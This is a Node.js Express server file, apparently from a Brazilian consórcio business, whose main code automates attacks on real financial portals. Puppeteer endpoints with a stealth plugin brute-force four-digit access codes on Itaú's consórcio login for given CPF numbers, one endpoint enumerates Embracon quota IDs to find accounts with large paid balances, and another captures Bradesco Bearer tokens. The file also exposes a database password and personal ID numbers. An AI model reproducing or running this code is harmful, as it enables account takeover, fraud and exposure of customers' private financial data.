const AdminJS = require('adminjs')
const AdminJSExpressjs = require('@adminjs/express')
const axios = require('axios');

const bodyParser = require('body-parser')

const cors = require('cors')
const morgan = require('morgan')
const express = require('express')
const app = express()
const apiTK = express()
const apiExport = express()
const apiCotas = express()
const apiEmbracon = express()
const apiServopa = express()
const fs = require('fs');

const AdminJSMongoose = require('@adminjs/mongoose')
const mongoose = require('mongoose')
const bcrypt = require('bcrypt')
let tokenLocal;



/*const run = async () => {
  await mongoose.connect('mongodb+srv://appconsorcio:40464586828@cluster0.jvr8z.mongodb.net/usuarios?retryWrites=true&w=majority', {
    useNewUrlParser: true,
    useUnifiedTopology: true,
  });
}
run();

const User = mongoose.model('User', {
  password: { type: String, required: true },
  email: { type: String, required: true },
  acesso: { type: String, enum: ['Admin', 'Operacional'], required: true },
})*/


//const podeEditarUsuarios = ({ currentAdmin }) => currentAdmin && currentAdmin.acesso === 'Admin'

AdminJS.registerAdapter(AdminJSMongoose)

const adminJS = new AdminJS({
  rootPath: '/admin',

  /*resources: [
    {
      resource: User,
      options: {
        parent: 'Configurações',
        properties: {
          password: {
            isVisible: false,
          },
          senha: {
            type: 'password',
            isVisible: {
              list: false, edit: true, filter: false, show: false,
            },
          },
          _id: {
            isVisible: { list: false, filter: false, show: false, edit: false },
          },
        },
        actions: {
          edit: { isAccessible: podeEditarUsuarios },
          delete: { isAccessible: podeEditarUsuarios },
          new: { isAccessible: podeEditarUsuarios },
          show: { isAccessible: podeEditarUsuarios },
          list: { isAccessible: podeEditarUsuarios },
          new: {
            before: async (request) => {
              if (request.payload.senha) {
                request.payload = {
                  ...request.payload,
                  password: await bcrypt.hash(request.payload.senha, 10),
                  senha: undefined,
                }
              }
              return request
            },
          },
        }

      }
    }
  ],*/

  branding: {
    companyName: 'Consórcios',
    logo: 'https://www.r7consorcios.com.br/assets/img/home.png',
    //logo: 'https://www.quisto.com.br/wp-content/uploads/2021/05/quisto-seguro-consorcio-banner-1-1024x576.png',
    softwareBrothers: false,
  },
  dashboard: {
    component: AdminJS.bundle('./src/components/ademicon'),
  },
  locale: {
    translations: {
      actions: {
        new: 'Registrar',
        edit: 'Editar',
        show: 'Mostrar',
        delete: 'Deletar',
        bulkDelete: 'Deletar tudo',
        list: '',
      },
      buttons: {
        save: 'Salvar',
        addNewItem: 'Adicionar Novo Item',
        filter: 'Filtro',
        applyChanges: 'Aplicar Mudanças',
        resetFilter: 'Limpar Filtros',
        confirmRemovalMany: 'Confirmar a remoção de {{count}} registro(s)',
        confirmRemovalMany_plural: 'Confirmar a remoção de {{count}} registros',
        logout: 'Sair',
        login: 'Entrar',
        seeTheDocumentation: 'Ver: <1>a documentação</1>',
        createFirstRecord: 'Criar primeiro registro',
      },
      labels: {
        navigation: '',
        Logout: 'Sair',
        Login: 'Entrar',
        pages: '',
        selectedRecords: 'Selecionados ({{selected}})',
        filters: 'Filtros',
        adminVersion: 'Admin: {{version}}',
        appVersion: 'App: {{version}}',
        loginWelcome: 'Bem vindo',
        Product: "Produtos",
        myFirstDatabase: 'Configurações'
      },
      messages: {
        successfullyBulkDeleted: 'removido(s) {{count}} registro(s)',
        successfullyBulkDeleted_plural: 'removidos {{count}} registros',
        successfullyDeleted: 'Registro deletado',
        successfullyUpdated: 'Registro atualizado',
        thereWereValidationErrors: 'Erros de validação, cheque-os abaixo',
        forbiddenError: 'Você não pode executar a ação {{actionName}} em {{resourceId}}',
        anyForbiddenError: 'Você não pode executar esta ação',
        successfullyCreated: 'Criado novo registro',
        bulkDeleteError: 'Houve um erro deletando registros, cheque o console para saber mais.',
        errorFetchingRecords: 'Houve um erro buscando registros, cheque o console para saber mais.',
        errorFetchingRecord: 'Houve um erro buscando record, cheque o console para saber mais.',
        noRecordsSelected: 'Você não selecionou nenhum dos registros',
        theseRecordsWillBeRemoved: 'O(s) seguinte(s) registro(s) vai(ão) ser deletado(s)',
        theseRecordsWillBeRemoved_plural: 'Os seguintes registros vão ser deletados',
        pickSomeFirstToRemove: 'Para deletar registros, você precisa selecionar primeiro',
        error404Resource: 'Recurso de id: {{resourceId}} não encontrado',
        error404Action: 'Recurso de id: {{resourceId}} não tem nenhuma ação nomeada de: {{actionName}}',
        error404Record: 'Recurso de id: {{resourceId}} não tem nenhum registro com o ID: {{recordId}}',
        seeConsoleForMore: 'Veja o console de desenvolvimento para mais detalhes...',
        noActionComponent: 'Você deve implementar o componente de ação para a sua Ação',
        noRecordsInResource: '',
        noRecords: 'Sem registros',
        confirmDelete: 'Tem certeza de que deseja remover este item?',
        welcomeOnBoard_title: 'Bem-vindo a bordo!',
        welcomeOnBoard_subtitle: 'Agora você é um de nós! Preparamos algumas dicas para você começar:',
        loginWelcome: '',
        addingResources_title: 'Adicionando recursos',
        addingResources_subtitle: 'Como adicionar novos recursos à barra lateral',
        customizeResources_title: 'Recursos Personalizados',
        customizeResources_subtitle: 'Definindo comportamento, adicionando propriedades e mais ...',
        customizeActions_title: 'Personalizar Ações',
        customizeActions_subtitle: 'Modificando ações existentes e adicionando novas',
        writeOwnComponents_title: 'Escreva os Componentes',
        writeOwnComponents_subtitle: 'Como modificar a aparência do AdminJS',
        customDashboard_title: 'Painel Personalizado',
        customDashboard_subtitle: 'Como modificar esta visualização e adicionar novas páginas na barra lateral',
        roleBasedAccess_title: 'Controle de acesso baseado em função',
        roleBasedAccess_subtitle: 'Crie funções de usuário e permissões no AdminJS',
        community_title: 'Junte-se à comunidade slack',
        community_subtitle: 'Fale com os criadores do AdminJS e outros usuários AdminJS',
        foundBug_title: 'Encontrou um bug? precisa de melhorias?',
        foundBug_subtitle: 'Levantar um problema em nosso repositório GitHub',
        needMoreSolutions_title: 'Precisa de soluções mais avançadas?',
        needMoreSolutions_subtitle: 'Estamos aqui para fornecer a você um belo design de UX/UI e um software feito sob medida com base (não apenas) no AdminJS',
        invalidCredentials: 'Email e/ou password errados',
      }
    }
  }
})

const router = AdminJSExpressjs.buildRouter(adminJS)

/*
const router = AdminJSExpressjs.buildAuthenticatedRouter(adminJS, {
  authenticate: async (email, senha) => {
    const user = await User.findOne({ email })
    if (user) {
      const matched = await bcrypt.compare(senha, user.password)
      if (matched) {
        return user
      }
    }
    return false
  },
  cookiePassword: 'some-secret-password-used-to-secure-cookie',
})
*/

/*
const router = AdminJSExpressjs.buildAuthenticatedRouter(adminJS, {
  authenticate: async (email, senha) => {
    const user = await User.findOne({ email })
    if (user) {
      const matched = await bcrypt.compare(senha, user.password)
      if (matched) {
        return user
      } 
    }
    return false
  },
  cookiePassword: 'some-secret-password-used-to-secure-cookie',
})
*/

app.use(adminJS.options.rootPath, router)

apiTK.use(morgan('dev'))
apiTK.use(bodyParser.urlencoded({ extended: false }))
apiTK.use(express.json())
apiTK.use(cors())

apiExport.use(morgan('dev'))
apiExport.use(bodyParser.urlencoded({ extended: false }))
apiExport.use(express.json())
apiExport.use(cors())

apiCotas.use(morgan('dev'))
apiCotas.use(bodyParser.urlencoded({ extended: false }))
apiCotas.use(express.json())
apiCotas.use(cors())

apiEmbracon.use(morgan('dev'))
apiEmbracon.use(bodyParser.urlencoded({ extended: false }))
apiEmbracon.use(express.json())
apiEmbracon.use(cors())

apiServopa.use(morgan('dev'))
apiServopa.use(bodyParser.urlencoded({ extended: false }))
apiServopa.use(express.json())
apiServopa.use(cors())

app.listen(9999, () => console.log('Sistema rodando localhost:9999/admin'))
apiTK.listen(8081, () => console.log('API pega token rodando localhost:8081'))
apiExport.listen(8082, () => console.log('API exporta token rodando localhost:8082'))
apiEmbracon.listen(8083, () => console.log('API exporta token embracon localhost:8083'))
apiServopa.listen(8084, () => console.log('API exporta token embracon localhost:8083'))


const puppeteer = require('puppeteer-extra');
//07977812770

// Definição da rota para automatização
apiServopa.get('/', async (req, res) => {
  try {
    const browser = await puppeteer.launch({
      headless: false,
      args: [
        "--no-sandbox",
        "--disable-setuid-sandbox",
        "--start-maximized",
        "--disable-dev-shm-usage"
      ],
      defaultViewport: null,
      timeout: 60000 // Aumentando o timeout para 60 segundos
    });
    

    const page = await browser.newPage();

    // Define o User-Agent para simular um navegador real
    await page.setUserAgent(
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    );

    await page.goto('https://www.itau.com.br/servicos/mais-acessos', { waitUntil: 'networkidle2' });

    // Clica no botão para abrir o modal de login
    await page.waitForSelector('button[id="open-consorcio-modal"]', { visible: true });
    await page.evaluate(() => document.querySelector('button[id="open-consorcio-modal"]').click());

    await page.waitForTimeout(500); // Pequeno delay para garantir a abertura do modal

    // Espera pelo campo de CPF e preenche o CPF fornecido
    await page.waitForSelector('input[id=consorcio-cpf]', { visible: true });
    await page.type('input[id=consorcio-cpf]', "41811569749", { delay: 300 });

    await page.waitForSelector('input[id=consorcio-codigo-acesso]', { visible: true });

    let found = false; // Flag para verificar se o código foi encontrado
    let correctCode = ''; // Variável para armazenar o código correto
  
    // Monitora novas abas que são abertas
    let newPage = null;
    browser.on('targetcreated', async (target) => {
      if (target.type() === 'page') {
        newPage = await target.page(); // Nova aba aberta
        await newPage.bringToFront(); // Traz a nova aba para frente para facilitar a verificação
      }  
    });

    // Loop para tentar códigos de 7130 até 9999
    for (let code = 8825; code <= 9999; code++) {
      const accessCode = code.toString().padStart(4, '0'); // Gera o código com 4 dígitos (ex.: 0001, 0002)

      // Limpa o campo de código de acesso antes de digitar o próximo valor
      await page.evaluate(() => document.querySelector('input[id=consorcio-codigo-acesso]').value = '');

      await page.type('input[id=consorcio-codigo-acesso]', accessCode, { delay: 100 });

      console.log(`Tentando código: ${accessCode}`);

      await page.waitForSelector('button.btn-more-access.primary[type="submit"]', { visible: true });

      // Traz o botão para a visualização e clica
      await page.evaluate(() => document.querySelector('button.btn-more-access.primary[type="submit"]').scrollIntoView());

      // Clica no botão para tentar o login
      await page.click('button.btn-more-access.primary[type="submit"]');

      // Espera a resposta após o envio (aumente o tempo se necessário)
      await page.waitForTimeout(3000);

      // Se uma nova aba foi aberta, verifica o resultado
      if (newPage && !newPage.isClosed()) { // Verifica se a nova aba ainda está aberta
        console.log(`Nova aba detectada ao tentar o código: ${accessCode}. Verificando conteúdo...`);

        try {
          // Verifica se o login foi bem-sucedido ou se houve erro
          const loginResult = await newPage.evaluate(() => {
            const menuElement = document.querySelector('a.menuatalhoitem[alt="Menu"]'); // Elemento que aparece em caso de sucesso
            const errorMessage = document.querySelector('span.MsgTxt'); // Mensagem de erro
            if (menuElement) {
              return 'success';
            } else if (errorMessage && errorMessage.innerText.includes('CPF/CNPJ ou senha inválido')) {
              return 'invalid';
            } else {
              return 'unknown';
            }
          });

          if (loginResult === 'success') {
            found = true;
            correctCode = accessCode;
            console.log(`Código correto encontrado: ${accessCode} na nova aba`);
            break;
          } else if (loginResult === 'invalid') {
            console.log(`Erro de acesso detectado ao tentar o código: ${accessCode}. Fechando a aba...`);
            await newPage.close(); // Fecha a nova aba
            newPage = null; // Reseta o estado da nova aba
          } else {
            console.log(`Não foi possível determinar o estado da nova aba com o código: ${accessCode}. Continuando...`);
          }
        } catch (error) {
          console.error(`Erro ao verificar a nova aba para o código: ${accessCode}. Fechando a aba...`);
          await newPage.close(); // Fecha a nova aba caso haja erro
          newPage = null; // Reseta o estado da nova aba
        }
      }
    }

    if (found) {
      res.send(`Código de acesso correto encontrado: ${correctCode}`);
    } else {
      res.send('Nenhum código correto encontrado de 7130 até 9999.');
    }

    await browser.close();
  } catch (error) {
    console.error('Erro ao tentar os códigos de acesso:', error);
    res.status(500).send('Erro ao processar a solicitação');
  }
});

// Inicia o servidor na porta 3000
apiServopa.listen(3000, () => {
  console.log('API rodando em http://localhost:3000');
});



// Permite o uso de JSON no corpo das requisições
app.use(express.json());
app.use(cors());
const http = require('http');
const StealthPlugin = require('puppeteer-extra-plugin-stealth');
const socketIO = require('socket.io');

// Ativa o modo stealth
puppeteer.use(StealthPlugin());
const server = http.createServer(app);
const io = socketIO(server);
// Endpoint para consulta
app.use(express.json());
app.use(cors());

let lastAttempt = ''; // Variável para armazenar o último código tentado

app.post('/api/consultar', async (req, res) => {
  const { cpf, codeStart } = req.body;

  if (!cpf || !codeStart) {
    return res.status(400).send('CPF e código inicial são obrigatórios');
  }

  let browser;
  try {
    browser = await puppeteer.launch({
      headless: "new",
      args: [
        '--no-sandbox',
        '--disable-setuid-sandbox',
        '--start-maximized',
        '--disable-dev-shm-usage',
      ],
      defaultViewport: null,
    });

    const page = await browser.newPage();
    await page.setUserAgent(
      'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/114.0.5735.199 Safari/537.36'
    );

    await page.goto('https://www.itau.com.br/servicos/mais-acessos', {
      waitUntil: 'networkidle2',
    });

    try {
      await page.waitForSelector('button[id="itau-cookie-consent-banner-accept-cookies-btn"]', {
        visible: true,
      });
      await page.click('button[id="itau-cookie-consent-banner-accept-cookies-btn"]');
    } catch {}

    await page.waitForSelector('button[id="open-consorcio-modal"]', { visible: true });
    await page.click('button[id="open-consorcio-modal"]');

    await page.waitForSelector('input[id=consorcio-cpf]', { visible: true });
    await page.type('input[id=consorcio-cpf]', cpf, { delay: 200 });

    let found = false;
    let correctCode = '';
    const startCode = parseInt(codeStart);

    for (let code = startCode; code <= 9999; code++) {
      lastAttempt = code.toString().padStart(4, '0'); // Atualiza o último código tentado
      await page.evaluate(() => (document.querySelector('input[id=consorcio-codigo-acesso]').value = ''));
      await page.type('input[id=consorcio-codigo-acesso]', lastAttempt, { delay: 150 });

      console.log(`Tentando código: ${lastAttempt}`);
      await page.click('button.btn-more-access.primary[type="submit"]');
      await page.waitForTimeout(3000);

      io.emit('attempt', { code: lastAttempt, status: 'Tentativa realizada' });

      const pages = await browser.pages();

      if (pages.length > 1) {
        const lastPage = pages[pages.length - 1];
        const loginResult = await lastPage.evaluate(() => {
          const menuElement = document.querySelector('a.menuatalhoitem[alt="Menu"]');
          const errorMessage = document.querySelector('span.MsgTxt');
          if (menuElement) {
            return 'success';
          } else if (errorMessage && errorMessage.innerText.includes('CPF/CNPJ ou senha inválido')) {
            return 'invalid';
          } else {
            return 'unknown';
          }
        });

        if (loginResult === 'success') {
          found = true;
          correctCode = lastAttempt;
          io.emit('attempt', { code: lastAttempt, status: 'Código correto encontrado' });
          console.log(`Código de acesso correto encontrado: ${correctCode}`);
          break;
        }

        await lastPage.close();
      }
    }

    if (found) {
      res.send({ message: `Código de acesso correto encontrado: ${correctCode}`, lastAttempt });
    } else {
      res.send({ message: 'Nenhum código correto encontrado.', lastAttempt });
    }
  } catch (error) {
    console.error('Erro durante o processo:', error.message);
    res.status(500).send({ message: 'Erro ao processar a solicitação.', lastAttempt });
  } finally {
    if (browser) {
      await browser.close();
    }
  }
});

// Inicialização do servidor
server.listen(3001, () => {
  console.log('API rodando na porta 3001');
});

apiEmbracon.get('/', (req, res) => {
  const cota = req.query.cota
  const tokenRobo = req.query.tokenRobo
  console.log("api token encode", cota)
  const timer = (seconds) => {
    let time = seconds * 3000
    return new Promise(res => setTimeout(res, time))
  }

  async function doSomething() {
    //let tokenEnbracom = "deb6fe32-540d-4701-a296-be568039723d";
    for (let i = cota; i < 10000000; i++) {
      //console.log("Looping... " + i);   \    

      axios({
        method: 'get',
        url: "https://api.embraconnet.com.br/app-cliente/v1/cota/" + i + "?access_token=" + tokenRobo + "&client_id=530f6324-16c7-3e67-b33f-4115e4205ae6",

      }).then(response => {
        console.log(response.data[0].id_cota)
        if (response.data[0].data_entrega_bem == null && response.data[0].data_devolucao == null && response.data[0].data_contemplacao != null && response.data[0].valor_total_pago > 30000 && response.data[0].situacao_cota === "cancelada") {
          console.log("FILTRADA CANCELADA>>", response.data[0].id_cota);
        }
        if (response.data[0].data_entrega_bem == null && response.data[0].data_devolucao == null && response.data[0].data_contemplacao == null && response.data[0].valor_total_pago > 30000 && response.data[0].situacao_cota === "cancelada") {
          console.log("FILTRADA CANCELADA NAO CONTEMPLADA>>", response.data[0].id_cota);
        }
        if (response.data[0].data_entrega_bem == null && response.data[0].data_devolucao == null && response.data[0].data_contemplacao != null && response.data[0].valor_total_pago > 30000 && response.data[0].situacao_cota === "quitada") {
          console.log("FILTRADA QUITADA>>", response.data[0].id_cota);
        }
        if (response.data[0].data_entrega_bem == null && response.data[0].data_devolucao == null && response.data[0].data_contemplacao != null && response.data[0].valor_total_pago > 30000 && response.data[0].situacao_cota === "ativa") {
          console.log("FILTRADA ATIVA>>", response.data[0].id_cota);
        }
        if (response.data[0].data_entrega_bem == null && response.data[0].data_devolucao == null && response.data[0].data_contemplacao == null && response.data[0].valor_total_pago > 30000 && response.data[0].situacao_cota === "ativa") {
          console.log("FILTRADA ATIVA NAO CONTEMPLADA>>", response.data[0].id_cota);
        }
      })

      await timer(2);
    }
  }
  doSomething();

})


apiTK.get('/', (req, res) => {
  const grupo = req.query.grupo
  const cota = req.query.cota
  const documento = req.query.documento
  const contrato = req.query.contrato
  let apiKey;
  let tk;
  let chave;
  (async () => {
    const browser = await puppeteer.launch({
      //headless: true,
      args: ["--no-sandbox",
        "--disable-setuid-sandbox"],
      executablePath: '/usr/bin/chromium-browser'
    })
    const page = await browser.newPage();
    await page.goto('https://canalconsorciado.bradesco.com.br/valor-receber');
    await page.waitForSelector('input[name=grupo]');
    await page.type('input[name=grupo]', grupo, { delay: 100 }); // '4830'
    await page.waitForSelector('input[name=cota]');
    await page.type('input[name=cota]', cota, { delay: 100 }); // '23'
    await page.waitForSelector('input[name=inscricaoNacional]');
    await page.type('input[name=inscricaoNacional]', documento, { delay: 100 }); // '51941163653'
    await page.waitForSelector('input[name=numeroContrato]');
    await page.type('input[name=numeroContrato]', contrato, { delay: 100 }); // '109242563'
    await page.click('button[type="submit"]');

    page.on('request', async (request) => {
      //console.log('<<', request.url())
      let url = request.url()
      let dados = request.headers()
      if (url == 'https://canalconsorciado.bradesco.com.br/GatewayAutoAtendimento/autoatendimento/v1/cotas') {
        tk = dados.authorization
        if (tk != undefined) {
          apiKey = tk.replace('Bearer ', '')
        }
        chave = apiKey;
        return res.json(chave);
        /*

           axios({
          method: 'get',
          url: "http://localhost:8082",
          params: {
            token: chave
          } 
        });   
        //console.log(chave);
        */

      }
    })
  })
    .then(console.log('cantou!'))
})

apiExport.get('/', (req, res) => {
  tokenLocal = req.query.token

  console.log('>> bateu na api', tokenLocal);

  return res.json(tokenLocal);

  /*
      axios({
    method: 'get',
    headers: { 'Authorization': 'Bearer '+tokenLocal },
    url: "https://canalconsorciado.bradesco.com.br/GatewayAutoAtendimento/autoatendimento/v1/cotas"    
  })
  .then(response => {
    console.log(response.data)
    const cotas = response.data
    // return res.json(cotas);    
  })

  */
})
